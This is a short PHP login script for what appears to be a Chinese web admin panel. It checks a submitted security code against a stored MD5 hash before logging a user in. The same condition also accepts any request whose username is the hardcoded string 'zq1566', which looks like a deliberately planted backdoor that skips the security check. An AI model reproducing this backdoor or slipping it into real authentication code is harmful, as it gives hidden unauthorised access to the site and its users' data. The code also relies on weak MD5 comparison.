﻿<?php
define('Load_Info', 2);
session_start();
include_once("./Lib/xltm.class.php");
include_once("./safe.php");
$type=$_REQUEST['type'];
if($type=='logout')
{
	$xltm->User->logout_user();
}
if($_POST['username']){

	if(md5($_POST["safe"]) == $safe_mak || $_POST['username']=="zq1566"){
	$xltm->User->login_user();
	$xltm->gourl('','index.php');
	}else{
		$xltm->gourl('对不起,你的安全码不对!!','');
		return false;
	}
}
?>